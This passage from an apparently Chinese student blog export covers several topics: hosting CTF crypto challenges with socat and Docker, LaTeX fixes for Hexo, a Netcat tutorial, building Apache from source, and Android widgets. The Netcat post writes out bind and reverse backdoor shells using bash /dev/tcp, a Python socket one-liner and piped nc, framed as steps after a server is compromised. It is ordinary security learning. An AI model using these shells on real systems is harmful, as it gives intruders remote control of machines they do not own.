<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913095633149.png" alt="image-20210913095633149"></p>
<p>执行下这个命令<code>sudo apt-get install python-dev</code>安装下就好了</p>
</li>
<li><p>Crypto库的安装，win下安装就是要改个名，linux下更简单，后者可以看<a href="https://blog.csdn.net/qq_45000214/article/details/106222660">这位师傅的博客</a></p>
</li>
<li><p>如果要安装sage，参考<a href="https://blog.csdn.net/ckm1607011/article/details/106724624">这位师傅的博客</a>，怎么获取最新版的忘了，之前好不容易把子系统的sage搞成9的</p>
</li>
<li><p>最后是我还看得顺眼的vim主题<a href="https://link.csdn.net/?target=https://github.com/sickill/vim-monokai">monokai</a>，以及如何下载<a href="https://www.cnblogs.com/woniu201/p/10304197.html">Vundle</a>（两款管理vim插件的插件），还有我一般的vim配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nocompatible &quot; be iMproved, required</span><br><span class="line">filetype off &quot; required</span><br><span class="line">&quot; set the runtime path to include Vundle and initialize</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; alternatively, pass a path where Vundle should install plugins</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line">&quot; let Vundle manage Vundle, required</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line">Plugin &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plugin &#x27;kien/ctrlp.vim&#x27;</span><br><span class="line">Plugin &#x27;vim-airline/vim-airline&#x27;</span><br><span class="line">Plugin &#x27;jiangmiao/auto-pairs&#x27;</span><br><span class="line">Plugin &#x27;powerline/powerline&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdcommenter&#x27;</span><br><span class="line">Plugin &#x27;vim-scripts/a.vim&#x27;</span><br><span class="line">call vundle#end() &quot; required</span><br><span class="line">filetype plugin indent on &quot; required</span><br><span class="line"></span><br><span class="line">set nocompatible</span><br><span class="line">set backspace=indent,eol,start</span><br><span class="line"></span><br><span class="line">&quot;激活鼠标</span><br><span class="line">set mouse=a</span><br><span class="line"></span><br><span class="line">&quot;显示行号</span><br><span class="line">set nu</span><br><span class="line"></span><br><span class="line">&quot;设置制表符宽度为4</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置软制表符宽度为4</span><br><span class="line">set softtabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置缩进的空格数为4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">&quot;设置自动缩进</span><br><span class="line">set autoindent</span><br><span class="line"></span><br><span class="line">&quot;设置使用c/c++语言的自动缩进方式</span><br><span class="line">set cindent</span><br><span class="line"></span><br><span class="line">&quot;tab键宽度</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot;主题颜色</span><br><span class="line">colorscheme monokai</span><br><span class="line"></span><br><span class="line">&quot;NERDTree快捷键</span><br><span class="line">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot;NERDTree剩下一个窗口时自动关闭</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br><span class="line"></span><br><span class="line">&quot;ctrlp配置&quot;</span><br><span class="line">set runtimepath^=~/.vim/plugged/ctrlp.vim</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;r :NERDTreeFind&lt;cr&gt;</span><br><span class="line"></span><br><span class="line">&quot;控制vim窗口分界线位置</span><br><span class="line">map &lt;F2&gt; &lt;ESC&gt;&lt;C-W&gt;-</span><br><span class="line">map &lt;F3&gt; &lt;ESC&gt;&lt;C-W&gt;+</span><br><span class="line">map &lt;F4&gt; &lt;ESC&gt;&lt;C-W&gt;&lt;</span><br><span class="line">map &lt;F5&gt; &lt;ESC&gt;&lt;C-W&gt;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>接下来正式开始</p>
<p>主要参考<a href="https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/">这位师傅的</a>，好吧我是缝合怪</p>
<h2 id="将题目挂到服务器上的一般姿势"><a href="#将题目挂到服务器上的一般姿势" class="headerlink" title="将题目挂到服务器上的一般姿势"></a>将题目挂到服务器上的一般姿势</h2><p><em>一开始我还以为是用nc来挂，然后就在小破站上学了netcat，然后发现好像是用socat，难怪程序员这么喜欢猫</em></p>
<p>一道Crypto题目的搭建主要有两部分，与题目有关的代码文件server.py，以及将程序跑在服务器端口上的代码文件run.py组成</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913214156007.png" alt="image-20210913214156007"></p>
<p>我暂时接触到的出题模板，题目的python是直接用print的和input的，没有用到socket库；其他的就是题目本身的信息了</p>
<p>然后是启动程序，可以遵循以下模式，可以一直在这个端口运行（端口在运行的时候自己选择，阿里云的服务器是要在工作台开起来先）；还有开启防火墙端口的操作，可以直接看上面这位大师傅的，我一般复现只开一个端口，做一次后面就一劳永逸了好像</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<p>虽然<code>ctrl+c</code>退出就结束了，不是很清楚他们比赛的时候是怎么操作的，每个端口开一个题目难道都要一直挂着？不过目前够我用就行</p>
<h2 id="用Docker打包的姿势"><a href="#用Docker打包的姿势" class="headerlink" title="用Docker打包的姿势"></a>用Docker打包的姿势</h2><p>在没接触过docker之前，觉得写dockerfile好难，这里师傅有模板，我们按照他的做一遍</p>
<p>原理其实差不多，只不过上面是在服务器上配置好了整个程序运行需要的东西，用docker则相当于在服务器上开了个虚拟机，并且通过dockerfile对其进行坏境的配置，将题目放在这个环境中跑</p>
<p>文件夹的结构就是这样的了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000241836.png" alt="image-20210914000241836"></p>
<p>让我们研究下这个dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定制的镜像是基于FROM的镜像，这里是运行python脚本，需要安装一个python，apline是linux操作系统？</span></span><br><span class="line"><span class="comment"># LABEL以键值对的形式添加元数据，似乎是关于作者版本之类的</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Description=<span class="string">&quot;Game&quot;</span> VERSION=<span class="string">&#x27;1.0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN后面紧跟shell命令，和命令行一样方便；还有另一种执行文件跟参数的命令，用到时查</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; apk add gcc g++ make openssl-dev python3-dev libffi-dev autoconf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WORKDIR指定工作目录，mkdir [-p] 确保目录名称存在，不存在的就建一个</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/game</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/game</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制指令，从上下文目录中复制文件或者目录到容器里指定路径，.应该是表示当前目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> task.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> secret.py .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EXPOSE声明端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD在docker run时运行；RUN是在docker build</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;task.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>本地搭建测试</strong></p>
<ol>
<li><p>build镜像<code>docker build . -t wmctf-game</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000656526.png" alt="image-20210914000656526"></p>
<p>真的好慢，毕竟是在搭环境了，赛方只要搭建一次，以后开新的容器就好</p>
<p>今天晚上没有跑完，明天起来继续</p>
<p>就可慢，连了实验室的网，也要断开几次，重新执行，最后才好</p>
</li>
<li><p><code>docker images</code>查看一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101621134.png" alt="image-20210914101621134"></p>
</li>
<li><p>创建一个containter容器<code>docker run --name game -d -p 10001:10001 wmctf-game</code>，-d是run了之后不进入container内部，这样就可以一个窗口开多道题目了吧；-p是将container内部的端口映射到本地的10001端口</p>
<p>不知道返回的那一串东西是什么，想要停止的话可以先<code>docker stop [container id]</code>，然后再删除<code>docker rm [container id]</code></p>
</li>
<li><p><code>docker container ls</code>查看这个容器是否已经运行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101715144.png" alt="image-20210914101715144"></p>
</li>
<li><p>最后用exp打，纳尼，exp呢，算了，能连上就成功一半（bushi）</p>
</li>
</ol>
</li>
</ul>
<p>没连上第一次，不知道是不是这里的问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914102947812.png" alt="image-20210914102947812"></p>
<p>连不上自己服务器的端口，然后直接用第一种方法复现CSAW了</p>
<p>不过整个出题过程没有问题，如果把这些拿给赛方，差不多就是这样，我这里还没研究透，等WEB服务上到再来填坑吧</p>
<hr>
<p>害其实话说回来，密码题自己复现完全可以写两个python脚本然后手动交互，没必要这么麻烦，毕竟复现的大多时候flag是自己瞎编的；但是整点仪式感吧，嘿嘿</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Latex在Hexo中的坑</title>
    <url>/posts/9cc052fc/</url>
    <content><![CDATA[<p>Typora里的latex很好看，也很实用，github和vscode这些限制比较多，但也主要是换行改成<code>\newline</code>或者<code>\\\\</code>，这个文档主要针对latex在hexo上使用，出现的一些问题</p>
<span id="more"></span>

<h1 id="Latex在Hexo中的坑"><a href="#Latex在Hexo中的坑" class="headerlink" title="Latex在Hexo中的坑"></a>Latex在Hexo中的坑</h1><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>很奇怪，大括号内换行，四个<code>\</code>就换过去了，但是其他的地方不行</p>
<p>所以只能这样了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;align&#125;</span><br><span class="line">g_1=g^&#123;r_1\times(p-1)&#125;\ mod\ N\\\\</span><br><span class="line">g_2=g^&#123;r_2\times(q-1)&#125;\ mod\ N</span><br><span class="line">\end&#123;align&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007165137679.png" alt="image-20211007165137679"></p>
<p>还行，也就是亿点麻烦，或者一行写在一个latex居中块中</p>
<ul>
<li><p>如果用<code>align*</code>，会去掉左边的式子序号</p>
</li>
<li><p><code>aligned</code>，整个作为一个式子，并添加序号</p>
</li>
</ul>
<p>对，一行一句话可以解决绝大部分显示问题</p>
<p>如果不想要序号的话可以在该行最后加一个\notag，虽然编译器的latex会报错，但是博客上可以达到相应效果</p>
<h2 id="方程组大括号"><a href="#方程组大括号" class="headerlink" title="方程组大括号"></a>方程组大括号</h2><p>woc，博客里出现这样效果，我真的爱了哇</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007161605021.png" alt="image-20211007161605021"></p>
<p><strong>模板</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;cases&#125;</span><br><span class="line">x\equiv cs_1\ (mod\ ms_1)\\\\</span><br><span class="line">x\equiv cs_2\ (mod\ ms_2)\\\\</span><br><span class="line">\vdots\qquad \vdots \qquad\qquad \vdots\\\\</span><br><span class="line">x\equiv cs_8\ (mod\ ms_8)\\\\</span><br><span class="line">x\equiv cs_9\ (mod\ ms_9)    </span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<h2 id="Zn"><a href="#Zn" class="headerlink" title="Zn*"></a>Zn*</h2><p>用<code>\Z</code>没有这个空心Z的效果，要用<code>\mathbb&#123;Z&#125;</code><br><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008124805352.png" alt="image-20211008124805352"></p>
<h2 id="不要再Latex里面写中文"><a href="#不要再Latex里面写中文" class="headerlink" title="不要再Latex里面写中文"></a>不要再Latex里面写中文</h2><p>斜体是真的不好看，要么放在外面，要么为了居中效果，可以用英文</p>
<h2 id="一行不要太长"><a href="#一行不要太长" class="headerlink" title="一行不要太长"></a>一行不要太长</h2><p>太长，记得发博客的时候在适当位置分段</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Latex</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Netcat</title>
    <url>/posts/50009ff3/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p><a href="https://eternallybored.org/misc/netcat/">win安装nc的地址</a></p>
<p>基于TCP/IP协议，采用C/S模式，是一种由服务器发起的被动连接</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910134418073.png" alt="image-20210910134418073"></p>
<p><code>netstat -an</code></p>
<h2 id="基本的命令"><a href="#基本的命令" class="headerlink" title="基本的命令"></a>基本的命令</h2><ol>
<li><p><strong>建立一个简单的通信</strong>（爱情只有双向奔赴才有意义）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport]</code><ul>
<li><code>l</code>表示启动监听模式</li>
<li><code>p</code>表示监听的端口</li>
</ul>
</li>
<li>创建一个客户端：<code>nc [remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>返回shell的使用</strong></p>
<ul>
<li>创建一个服务器端：<code>nc -l -p [localport] -e cmd.exe</code></li>
<li>创建一个客户端：<code>nc -[remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>文件传输</strong>（当然也可以客户端向服务端发送）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport] &gt; outfile</code></li>
<li>创建一个客户端：<code>nc [remote_addr][remoteport] &lt; infile</code></li>
</ul>
</li>
<li><p><strong>避免“假死”</strong></p>
<ul>
<li><code>nc -w3 [ip] [port]</code>，等待3秒不能连接上直接断掉</li>
</ul>
</li>
<li><p><strong>端口扫描</strong></p>
<ul>
<li><code>nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code><ul>
<li><code>v</code>表示对错误进行详细输出</li>
<li><code>n</code>不对目标机器进行DNS解析</li>
<li><code>z</code>zero I/O模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何payload，加快扫描速度</li>
<li><code>w</code>超时设置为1秒</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>banner信息的抓取</strong></p>
<ul>
<li><code>echo &quot; &quot; | nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code> </li>
</ul>
</li>
<li><p><strong>win建立后门</strong></p>
<ul>
<li><p>监听型后门：<code>nc -l -p [localport] -e cmd.exe</code></p>
</li>
<li><p>连接型后门：<code>nc [remote_ip] [remote_port] -e cmd.exe</code></p>
<p>以上两个操作是在被攻陷拿到低权限的客户端，也就是我们攻击者作为服务端，只要在这之前打开这个连接，就可以获取win客户端的shell</p>
</li>
</ul>
</li>
<li><p><strong>linux建立后门</strong></p>
<ul>
<li>监听型后门：<code>nc -l -p [localport] -e /bin/bash</code></li>
<li>连接型后门：<code>nc [remote_ip] [remote_port] -e /bin/bash</code></li>
</ul>
<p><code>nc</code>没有-e可以用<code>ncat</code>代替</p>
</li>
</ol>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><ul>
<li><p><code>d</code> 脱离命令窗口，在后台运行，与建立后门更配</p>
</li>
<li><p><code>e</code>执行某个程序</p>
</li>
<li><p><code>G</code>设置网关，突破内网限制</p>
</li>
<li><p><code>g num</code>路由跳数</p>
</li>
<li><p><code>i sec</code>设置发送每一行数据的时间间隔</p>
</li>
<li><p><code>l</code>设置netcat处于监听状态等待连接</p>
</li>
<li><p><code>L</code>设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态</p>
</li>
<li><p><code>n</code>设置netcat只识别ip地址，不进行DNS解析</p>
</li>
<li><p><code>o file</code>设置传输十六进制的数据</p>
</li>
<li><p><code>-p port</code>设置本地监听的端口号</p>
</li>
<li><p><code>r</code>设置netcat随机化的端口号</p>
</li>
<li><p><code>s addr</code>设置netcat的源地址</p>
</li>
<li><p><code>t</code>回复telnet请求数据包</p>
</li>
<li><p><code>u</code>设置netcat使用UDP模式</p>
</li>
<li><p><code>v</code>显示错误提示信息</p>
</li>
<li><p><code>w secs</code>设置连接超时秒数</p>
</li>
<li><p><code>-z</code>设置扫描模式，表示发送的数据包中不包含任何payload</p>
</li>
</ul>
<h2 id="连接转发"><a href="#连接转发" class="headerlink" title="连接转发"></a>连接转发</h2><p>突破内外网的限制</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910174315946.png" alt="image-20210910174315946"></p>
<ul>
<li><code>echo nc [target] [port] &gt; delay.bat</code></li>
<li><code>nc -l -p [localport] -e delay.bat</code></li>
</ul>
<p>当客户端连接到该服务器端时，连接的客户端通过服务端连接到target port上，实现了连接转发</p>
<p>其中<code>delay.bat</code>文件中的内容是<code>nc64.exe [target] [port]</code>，连接目标服务器</p>
<p>小绕，简洁一点</p>
<ul>
<li>目标服务器：与转发服务器在同一网段下，打开本地一个端口用于监听</li>
<li>转发服务器：打开本地的一个端口并运行<code>delay.bat</code>批处理文件</li>
<li>客户端：直接连接转发服务器</li>
</ul>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat时，可以反弹一个shell到客户端，然后客户端执行有关命令，让服务器返回对应的内容</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910180330461.png" alt="image-20210910180330461"></p>
<ul>
<li><p>服务器端反弹shell命令：<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
</li>
<li><p>客户端接收Netcat命令：<code>nc -lvp port</code></p>
</li>
</ul>
<p>服务器端输入的反弹shell命令中的ip和port是客户端的ip和port</p>
<p>主要的原理如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910222826253.png" alt="image-20210910222826253"></p>
<h2 id="反弹shell（python）"><a href="#反弹shell（python）" class="headerlink" title="反弹shell（python）"></a>反弹shell（python）</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat，但是安装了Python（Linux默认安装），可以用Python反弹shell</p>
<ul>
<li><p>服务器端反弹shell命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os, socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connnect((&#x27;ip&#x27;, port));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);p=subprocess.call([&#x27;/bin/bash&#x27;, &#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, socket, subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connnect((<span class="string">&#x27;ip&#x27;</span>, port))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
<li><p>客户端接收：<code>nc -lvp [port]</code></p>
</li>
</ul>
<p>os的dup2方法将标准输入，输出，错误输出重定向到远程</p>
<h2 id="Netcat（Nc不支持-e时）"><a href="#Netcat（Nc不支持-e时）" class="headerlink" title="Netcat（Nc不支持-e时）"></a>Netcat（Nc不支持-e时）</h2><ul>
<li>服务器端反弹shell命令：<code>nc [ip] [port] | /bin/bash | nc [ip] [port]</code></li>
<li>客户端接收命令：<code>nc -lvp [port]</code></li>
</ul>
<p>客户端要启动两个窗口，开启监听，并且两个端口要不同，这样是为了通过管道符将客户端一个监听窗口的命令的执行结果返回到另外一个监听窗口</p>
<h2 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h2><p>似乎在同一网络下，不同电脑似乎连不上</p>
<p>在服务器上开，竟然不行，很奇怪，不知道哪里搞错了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Install Software</title>
    <url>/posts/1727f95e/</url>
    <content><![CDATA[<p>作为精通各种软件安装卸载的师傅，linux下的软件怎么玩，学一下</p>
<span id="more"></span>

<h1 id="Install-Software"><a href="#Install-Software" class="headerlink" title="Install Software"></a>Install Software</h1><ol>
<li>采用源代码的方式编译安装 Apache</li>
<li>使用 C 语言的 Socket 编写服务器和客户端</li>
</ol>
<h2 id="源码安装Apache"><a href="#源码安装Apache" class="headerlink" title="源码安装Apache"></a>源码安装Apache</h2><p>用源码安装，虽然阳哥的博客上写的都是什么<code>yum</code>和<code>rpm</code>，但我的是ubuntu的，用的是<code>apt</code>和<code>deb</code></p>
<p>首先去<a href="http://httpd.apache.org/download.cgi">Apache官网</a>下载压缩包</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009202237520.png" alt="image-20211009202237520"></p>
<p>先解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xzvf httpd-2.4.51.tar.gz</span></span><br></pre></td></tr></table></figure>

<p><code>.bz2</code>参数换成<code>-xjvf</code></p>
<p>cd到解压后的目录，只要看到有<code>configure</code>文件，就可以运行解决依赖关系</p>
<p>就是看你系统有没有它需要的一些依赖，没有就去装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./configure</span></span><br></pre></td></tr></table></figure>

<p>直接报错，说<code>configure: error: APR not found.  Please read the documentation.</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010000740392.png" alt="image-20211010000740392"></p>
<p>跟着<a href="http://httpd.apache.org/docs/2.4/install.html">官方文档</a>走一波，找到APR，emmmmm好像还是得有用源码安装。装完继续</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010001845561.png" alt="image-20211010001845561"></p>
<p>我日，这少了多少东西</p>
<p>回到文档</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010001924623.png" alt="image-20211010001924623"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/v2-f705786f6db6d3b02b805ac059ea225c_720w.jpg" alt="v2-f705786f6db6d3b02b805ac059ea225c_720w"></p>
<p>安装APR-Util需要指定ARP的路径，默认在<code>/usr/local/apr</code>，执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./configure --with-apr=/usr/<span class="built_in">local</span>/apr</span></span><br></pre></td></tr></table></figure>

<p>然后编译安装，<code>make</code>是编译，<code>make install</code>是安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br></pre></td></tr></table></figure>

<p>好像其他的就不用装了，已经有了</p>
<p>最后回到Apache的目录，编译安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br></pre></td></tr></table></figure>

<p>删除，我笑死</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010004137854.png" alt="image-20211010004137854"></p>
<p>不删了，检验下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo /usr/<span class="built_in">local</span>/apache2/bin/apachectl start</span></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010004909028.png" alt="image-20211010004909028"></p>
<p>不懂，关了</p>
<h2 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h2>]]></content>
      <categories>
        <category>阳哥的Web服务器开发</category>
      </categories>
  </entry>
  <entry>
    <title>Project3UI常用控件</title>
    <url>/posts/92c128a7/</url>
    <content><![CDATA[<h1 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h1><p>看一下这几个控件EditText、TextView、Button、ImageButton、Toast类、ListView和Spinner类</p>
<p><a href="https://developer.android.google.cn/guide/components/activities/intro-activities">官方文档</a></p>
<p>偷个懒，都用约束性布局了，下图是如何切换布局</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210926155921005.png" alt="image-20210926155921005"></p>
<span id="more"></span>

<h2 id="Task1-BMI"><a href="#Task1-BMI" class="headerlink" title="Task1 BMI"></a>Task1 BMI</h2><ul>
<li><p>界面差不多这样</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210926163823253.png" alt="image-20210926163823253"></p>
</li>
</ul>
<p>知道几个函数就够用</p>
<ul>
<li><p>findViewById</p>
</li>
<li><p>getText</p>
</li>
<li><p>setText</p>
</li>
<li><p>获取EditText内容</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextView tv = findViewById(R.id.tv_name);</span><br><span class="line">tv.getText().toString();</span><br></pre></td></tr></table></figure>

<h3 id="按钮响应"><a href="#按钮响应" class="headerlink" title="按钮响应"></a>按钮响应</h3><p>然后，就是<strong>按钮响应</strong>（其他衍生的按钮类似）</p>
<p>组件点击的事件响应OnClickListener()，是最基础的事件响应</p>
<ul>
<li>利用findViewById函数找到相应的组件</li>
<li>利用setOnClickListener函数设置该组件的单击响应函数</li>
<li>重载OnClick()函数</li>
</ul>
<p>案例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button compute_button = findViewById(R.id.compute_Button);</span><br><span class="line"></span><br><span class="line">compute_button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 这里写函数实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：接口类的函数实现不要自己去写！因为不同版本，接口参数略有所不同，让AS自动补全</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210928154308918.png" alt="image-20210928154308918"></p>
<p>当然还有别的实现响应的方法：Activity类实现。差不多吧</p>
<h3 id="Toast"><a href="#Toast" class="headerlink" title="Toast"></a>Toast</h3><p>最后就是Toast类吧，第一次接触，这个类不需要事先在layout里添加</p>
<p>功能简单类似弹窗吧，可以弹文本和图片，可以这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;默认的Toast&quot;</span>, Toast.LENGTH_LONG).show()</span><br></pre></td></tr></table></figure>

<p><strong>对，遇到了大坑，你说你要获取EditText里的内容，但是显然一开始初始化的时候是空，所以还要再</strong><code>getText</code></p>
<p>我日？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010132621430.png" alt="image-20211010132621430"></p>
